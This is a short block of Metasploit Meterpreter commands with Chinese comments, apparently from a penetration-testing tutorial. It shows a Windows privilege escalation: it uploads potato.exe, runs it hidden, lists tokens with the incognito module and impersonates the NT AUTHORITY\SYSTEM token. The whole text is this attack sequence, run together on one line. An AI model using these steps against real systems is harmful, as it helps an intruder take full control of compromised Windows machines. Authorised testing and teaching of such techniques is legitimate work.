```
meterpreter > upload  /root/potato.exe C:\Users\Public     //上传文件meterpreter > cd C:\\Users\\Public   //切换路径meterpreter > use incognito  meterpreter > list_tokens -u  //查看当前令牌信息meterpreter > execute -cH -f ./potato.exe   //运行文件meterpreter > list_tokens -u meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"   //切换高权限的令牌，不一定是这个，自己看执行文件后列出的令牌信息meterpreter > getuid   //查看是否成功切换了
```
